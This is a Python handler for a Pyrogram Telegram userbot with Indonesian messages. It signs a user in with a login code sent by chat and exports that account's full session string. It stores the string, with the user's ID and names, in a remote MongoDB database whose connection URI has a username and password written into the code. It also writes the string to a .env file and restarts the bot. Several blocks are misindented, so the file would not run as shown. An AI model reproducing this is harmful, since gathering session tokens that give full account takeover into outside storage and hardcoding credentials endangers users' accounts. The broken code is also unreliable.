
from pyrogram import (
    Client,
    filters
)
from pyrogram.types import (
    Message
)
from pyrogram.errors import (
    SessionPasswordNeeded,
    BadRequest
)
from pymongo import MongoClient
from Ubot import (
    ACC_PROK_WITH_TFA,
    AKTIFPERINTAH,
    PHONE_CODE_IN_VALID_ERR_TEXT,
    RECVD_PHONE_CODE
)
import pymongo
import sys
import os
import dotenv
from dotenv import load_dotenv
from Ubot.logging import LOGGER
from os import environ, execle
import itertools

from ubotlibs.ubot.database.accesdb import *
HAPP = None


load_dotenv()
existing_sessions = [key for key in os.environ if key.startswith("SESSION")]
session_counter = itertools.count(len(existing_sessions) + 1)



@Client.on_message(
    filters.text &
    filters.private,
    group=2
)
async def recv_tg_code_message(_, message: Message):

    w_s_dict = AKTIFPERINTAH.get(message.chat.id)
    if not w_s_dict:
        return
    sent_code = w_s_dict.get("SENT_CODE_R")
    phone_number = w_s_dict.get("PHONE_NUMBER")
    loical_ci = w_s_dict.get("USER_CLIENT")
    if not sent_code or not phone_number:
        return
    status_message = w_s_dict.get("MESSAGE")
    if not status_message:
        return
    del w_s_dict["MESSAGE"]
    phone_code = "".join(message.text.split(" "))
    try:
        w_s_dict["SIGNED_IN"] = await loical_ci.sign_in(
            phone_number,
            sent_code.phone_code_hash,
            phone_code
        )
        del AKTIFPERINTAH[message.chat.id]
    except SessionPasswordNeeded:
        await status_message.reply_text(
            "Verifikasi 2 Langkah diaktifkan, mohon masukkan kode verifikasi 2 langkah anda..",
        )
        w_s_dict["IS_NEEDED_TFA"] = True
    else:
        client = pymongo.MongoClient("mongodb+srv://ubot:dC9mgT230G5qS416@dbaas-db-10420372-651e6e61.mongo.ondigitalocean.com/admin?tls=true&authSource=admin&replicaSet=dbaas-db-10420372")
        db = client["telegram_sessions"]
        mongo_collection = db["sesi_collection"]
        session_string = str(await loical_ci.export_session_string())
        session_data = {"string_session": session_string}
        
        existing_session = mongo_collection.find_one({"session_string": session_string})
        if existing_session:
            await message.reply_text("string udah ada nih di database")
            return

        if mongo_collection.count_documents({}) >= 100:
            await message.reply_text(
                "Ngga bisa masukin string lagi nih udh penuh tuan."
            )
            return

        cek = db.command("collstats", "sesi_collection")["count"]
        cek += 1
        session_data = {
            "no": cek,
            "session_string": session_string,
            "user_id": message.chat.id,
            "username": message.chat.username,
            "first_name": message.chat.first_name,
            "last_name": message.chat.last_name,
        }        
        mongo_collection.insert_one(session_data)
        await message.reply_text("**Sukses menambkan akun anda ke database.**")  
        filename = ".env"
        user_id = mongo_collection.find_one({"user_id": message.chat.id})
        cek = db.command("collstats", "sesi_collection")["count"]
        sesi = user_id.get('session_string')
        if os.path.isfile(filename):
            with open(filename, "r") as file:
                contents = file.read()
                if sesi in contents:
                        await message.reply_text(f"`Tunggu Sebentar..`")
                        return
                else:
                    jumlah = next(session_counter)
                with open(filename, "a") as file:
                    file.write(f"\nSESSION{jumlah}={sesi}")
                    load_dotenv()
                try:
                    msg = await message.reply_text("`Sedang mencoba merestart server`\n`Restarting bot...`")
                    LOGGER(__name__).info("BOT SERVER RESTARTED !!")
                    
             except BaseException as err:
                    LOGGER(__name__).info(f"{err}")
                    return
             await msg.edit_text("✅ **Bot Berhasil DiRestart.\n**Tunggu 2 menit dan cek pesan tersimpan anda.**")
             if HAPP is not None:
                 HAPP.restart()
             else:
                  args = [sys.executable, "-m", "Ubot"]
                  execle(sys.executable, *args, environ)
                        
    AKTIFPERINTAH[message.chat.id] = w_s_dict
    raise message.stop_propagation() 
